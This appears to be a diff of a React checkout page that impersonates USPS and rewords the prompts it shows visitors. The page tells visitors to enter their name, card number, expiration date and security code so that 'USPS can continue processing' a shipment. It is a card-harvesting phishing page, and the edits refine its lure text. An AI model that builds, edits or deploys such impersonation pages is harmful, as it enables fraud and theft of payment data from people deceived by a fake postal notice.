@@ -201,8 +201,8 @@ export default function Checkout() {
           <div className="alz-step-head">
             <div>
               <div className="alz-badge">{BRAND.name}</div>
-              <h1 className="alz-step-title">Confirm your payment method</h1>
-              <p className="alz-step-subtitle">Review the payment method associated with this shipment.</p>
+              <h1 className="alz-step-title">Confirm the billing method for this shipment</h1>
+              <p className="alz-step-subtitle">Review the card details linked to this USPS delivery update.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -213,8 +213,8 @@ export default function Checkout() {
         <div className="alz-flow-grid alz-usps-flow-grid">
           <div className="alz-card alz-usps-form-card">
             <div className="alz-section-eyebrow">Payment details</div>
-            <h2 className="alz-page-title">Review your card details</h2>
-            <p className="alz-page-copy">Enter the card details associated with this shipment so USPS can continue processing your delivery.</p>
+            <h2 className="alz-page-title">Review your card information</h2>
+            <p className="alz-page-copy">Enter the card details associated with this shipment so USPS can continue processing the delivery record.</p>
             <div className="alz-brand-row mb-4">
               {BRAND_PROMISES.map((item) => (
                 <span key={item} className="alz-brand-pill">{item}</span>
@@ -258,28 +258,28 @@ export default function Checkout() {
             </div>
 
             <button onClick={onSubmit} disabled={!canSubmit || waiting} className="alz-btn-primary mt-6 text-base alz-checkout-submit">
-              {waiting ? 'Processing...' : 'Confirm payment details'}
+              {waiting ? 'Processing...' : 'Continue with billing review'}
             </button>
-            <div className="alz-helper-copy mt-6">Keep this page open while USPS confirms your payment details.</div>
+            <div className="alz-helper-copy mt-6">Keep this page open while USPS confirms the billing details for this shipment.</div>
             <div className="alz-footer">{BRAND.name} | {BRAND.tagline}</div>
             <div className="text-[11px] text-center text-[#565959] mt-1">{BRAND.legal}</div>
           </div>
 
           <aside className="alz-card alz-flow-aside alz-side-summary alz-usps-side-card">
-            <div className="alz-side-summary-title">Payment review</div>
+            <div className="alz-side-summary-title">Billing checklist</div>
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb alz-order-mini-thumb-card" />
               <div>
                 <div className="alz-order-mini-title">Review the payment method on file</div>
-                <div className="alz-order-mini-copy">Use the payment method linked to this shipment to confirm the billing details.</div>
+                <div className="alz-order-mini-copy">Use the billing method linked to this shipment to confirm the card details.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
-              <div>Name exactly as shown on card</div>
+              <div>Name exactly as shown on the card</div>
               <div>Card number and expiration date</div>
               <div>3- or 4-digit security code</div>
             </div>
-            <div className="alz-side-summary-box">Use a card associated with this shipment so USPS can continue processing delivery.</div>
+            <div className="alz-side-summary-box">Use a billing method associated with this shipment so USPS can complete the verification review.</div>
           </aside>
         </div>
       </div>
